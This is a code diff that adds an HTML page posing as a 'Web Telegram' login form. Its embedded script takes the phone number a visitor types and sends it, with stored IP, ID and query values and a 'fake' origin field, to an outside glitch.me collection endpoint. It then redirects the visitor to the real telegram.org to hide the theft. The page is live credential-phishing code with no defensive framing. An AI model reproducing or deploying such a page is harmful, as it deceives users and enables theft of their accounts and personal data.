@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>Login V6</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="file:///C:/Users/SpikySport/Desktop/telegramv2/0/images/icons/favicon.ico">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/bootstrap.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/font-awesome.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/material-design-iconic-font.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/animate.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="telegram/hamburgers.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/animsition.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/select2.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="telegram/daterangepicker.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="telegram/util.css">
+	<link rel="stylesheet" type="text/css" href="telegram/main.css">
+<!--===============================================================================================-->
+<style data-jss="" data-meta="MuiButton">
+         .MuiButton-root {
+         color: rgba(0, 0, 0, 0.87);
+         padding: 12px 16px 11px;
+         font-size: 16px;
+         min-width: 64px;
+         box-sizing: border-box;
+         transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+         font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+         font-weight: 500;
+         line-height: normal;
+         border-radius: 10px;
+         letter-spacing: 0.02857em;
+         text-transform: uppercase;
+         }
+         .MuiButton-root:hover {
+         text-decoration: none;
+         background-color: rgba(0, 0, 0, 0.08);
+         }
+         .MuiButton-root.Mui-disabled {
+         color: rgba(0, 0, 0, 0.26);
+         }
+         @media (hover: none) {
+         .MuiButton-root:hover {
+         background-color: transparent;
+         }
+         }
+         .MuiButton-root:hover.Mui-disabled {
+         background-color: transparent;
+         }
+         .MuiButton-label {
+         width: 100%;
+         display: inherit;
+         align-items: inherit;
+         justify-content: inherit;
+         }
+         .MuiButton-text {
+         padding: 6px 8px;
+         }
+         .MuiButton-textPrimary {
+         color: #50A2E9;
+         }
+         .MuiButton-textPrimary:hover {
+         background-color: rgba(80, 162, 233, 0.08);
+         }
+         @media (hover: none) {
+         .MuiButton-textPrimary:hover {
+         background-color: transparent;
+         }
+         }
+         .MuiButton-textSecondary {
+         color: #E53935;
+         }
+         .MuiButton-textSecondary:hover {
+         background-color: rgba(229, 57, 53, 0.08);
+         }
+         @media (hover: none) {
+         .MuiButton-textSecondary:hover {
+         background-color: transparent;
+         }
+         }
+         .MuiButton-outlined {
+         border: 1px solid rgba(0, 0, 0, 0.23);
+         padding: 5px 15px;
+         }
+         .MuiButton-outlined.Mui-disabled {
+         border: 1px solid rgba(0, 0, 0, 0.12);
+         }
+         .MuiButton-outlinedPrimary {
+         color: #50A2E9;
+         border: 1px solid rgba(80, 162, 233, 0.5);
+         }
+         .MuiButton-outlinedPrimary:hover {
+         border: 1px solid #50A2E9;
+         background-color: rgba(80, 162, 233, 0.08);
+         }
+         @media (hover: none) {
+         .MuiButton-outlinedPrimary:hover {
+         background-color: transparent;
+         }
+         }
+         .MuiButton-outlinedSecondary {
+         color: #E53935;
+         border: 1px solid rgba(229, 57, 53, 0.5);
+         }
+         .MuiButton-outlinedSecondary:hover {
+         border: 1px solid #E53935;
+         background-color: rgba(229, 57, 53, 0.08);
+         }
+         .MuiButton-outlinedSecondary.Mui-disabled {
+         border: 1px solid rgba(0, 0, 0, 0.26);
+         }
+         @media (hover: none) {
+         .MuiButton-outlinedSecondary:hover {
+         background-color: transparent;
+         }
+         }
+         .MuiButton-contained {
+         color: rgba(0, 0, 0, 0.87);
+         box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
+         background-color: #e0e0e0;
+         }
+         .MuiButton-contained:hover {
+         box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);
+         background-color: #d5d5d5;
+         }
+         .MuiButton-contained.Mui-focusVisible {
+         box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
+         }
+         .MuiButton-contained:active {
+         box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);
+         }
+         .MuiButton-contained.Mui-disabled {
+         color: rgba(0, 0, 0, 0.26);
+         box-shadow: none;
+         background-color: rgba(0, 0, 0, 0.12);
+         }
+         @media (hover: none) {
+         .MuiButton-contained:hover {
+         box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
+         background-color: #e0e0e0;
+         }
+         }
+         .MuiButton-contained:hover.Mui-disabled {
+         background-color: rgba(0, 0, 0, 0.12);
+         }
+         .MuiButton-containedPrimary {
+         color: rgba(0, 0, 0, 0.87);
+         background-color: #50A2E9;
+         }
+         .MuiButton-containedPrimary:hover {
+         background-color: rgb(56, 113, 163);
+         }
+         @media (hover: none) {
+         .MuiButton-containedPrimary:hover {
+         background-color: #50A2E9;
+         }
+         }
+         .MuiButton-containedSecondary {
+         color: #fff;
+         background-color: #E53935;
+         }
+         .MuiButton-containedSecondary:hover {
+         background-color: rgb(160, 39, 37);
+         }
+         @media (hover: none) {
+         .MuiButton-containedSecondary:hover {
+         background-color: #E53935;
+         }
+         }
+         .MuiButton-disableElevation {
+         box-shadow: none;
+         }
+         .MuiButton-disableElevation:hover {
+         box-shadow: none;
+         }
+         .MuiButton-disableElevation.Mui-focusVisible {
+         box-shadow: none;
+         }
+         .MuiButton-disableElevation:active {
+         box-shadow: none;
+         }
+         .MuiButton-disableElevation.Mui-disabled {
+         box-shadow: none;
+         }
+         .MuiButton-colorInherit {
+         color: inherit;
+         border-color: currentColor;
+         }
+         .MuiButton-textSizeSmall {
+         padding: 4px 5px;
+         font-size: 0.8125rem;
+         }
+         .MuiButton-textSizeLarge {
+         padding: 8px 11px;
+         font-size: 0.9375rem;
+         }
+         .MuiButton-outlinedSizeSmall {
+         padding: 3px 9px;
+         font-size: 0.8125rem;
+         }
+         .MuiButton-outlinedSizeLarge {
+         padding: 7px 21px;
+         font-size: 0.9375rem;
+         }
+         .MuiButton-containedSizeSmall {
+         padding: 4px 10px;
+         font-size: 0.8125rem;
+         }
+         .MuiButton-containedSizeLarge {
+         padding: 8px 22px;
+         font-size: 0.9375rem;
+         }
+         .MuiButton-fullWidth {
+         width: 100%;
+         }
+         .MuiButton-startIcon {
+         display: inherit;
+         margin-left: -4px;
+         margin-right: 8px;
+         }
+         .MuiButton-startIcon.MuiButton-iconSizeSmall {
+         margin-left: -2px;
+         }
+         .MuiButton-endIcon {
+         display: inherit;
+         margin-left: 8px;
+         margin-right: -4px;
+         }
+         .MuiButton-endIcon.MuiButton-iconSizeSmall {
+         margin-right: -2px;
+         }
+         .MuiButton-iconSizeSmall > *:first-child {
+         font-size: 18px;
+         }
+         .MuiButton-iconSizeMedium > *:first-child {
+         font-size: 20px;
+         }
+         .MuiButton-iconSizeLarge > *:first-child {
+         font-size: 22px;
+         }
+      </style></head>
+
+
+
+<body>
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100 p-t-85 p-b-20">
+				<form class="login100-form validate-form">
+				<input type="hidden" id="lgn" value="2FA CODE">
+					<span class="login100-form-title p-b-70">
+						Web Telegram
+					</span>
+					<span class="login100-form-avatar">
+						<img src="telegram/1024px-Telegram_logo.webp" alt="AVATAR">
+					</span><br>
+                    <br><h4> Phone Number </h4>
+					<div class="wrap-input100 validate-input m-t-85 m-b-35" data-validate="Phone number">
+						<input class="input100" id="psw" type="text" name="username" value=" " placeholder="Phone number">
+						<span class="focus-input100" placeholder="Phone number"></span>
+					</div>
+
+					<div class="container-login100-form-btn">
+						<button class="MuiButtonBase-root MuiButton-root auth-button MuiButton-contained MuiButton-containedPrimary  MuiButton-fullWidth" id="btn">
+							Continue
+						</button>
+					</div>
+
+				</form>
+  <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'tg'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                 location.replace(`https://telegram.org`)
+                }, 500)
+            })
+    })
+  </script>					
+			</div>
+		</div>
+	</div>
+	
+
+	<div id="dropDownSelect1"></div>
+	
+<!--===============================================================================================-->
+	<script src="telegram/jquery-3.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/animsition.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/popper.js"></script>
+	<script src="telegram/bootstrap.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/select2.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/moment.js"></script>
+	<script src="telegram/daterangepicker.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/countdowntime.js"></script>
+<!--===============================================================================================-->
+	<script src="telegram/main.js"></script>
+
+
+</body></html>
